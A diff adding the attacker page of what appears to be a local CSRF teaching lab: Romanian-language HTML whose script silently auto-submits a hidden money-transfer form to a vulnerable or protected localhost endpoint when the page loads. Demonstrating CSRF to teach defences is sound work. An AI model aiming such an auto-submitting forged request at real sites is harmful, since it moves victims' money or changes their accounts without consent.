@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Malicious CSRF Site</title>
+  </head>
+  <body>
+    <h3 style="color: red">🏴 Site malițios activ</h3>
+    <p>Se încearcă un transfer automat de bani...</p>
+
+    <form id="csrfForm" method="POST" style="display: none">
+      <input type="hidden" name="amount" value="100" />
+      <input type="submit" value="Transfer" />
+    </form>
+
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const target = params.get("target");
+
+      let action = "http://localhost:4000/api/csrf/transfer-vulnerable";
+      if (target === "/csrf/protected") {
+        action = "http://localhost:4000/api/csrf/transfer-protected";
+      }
+
+      document.getElementById("csrfForm").action = action;
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
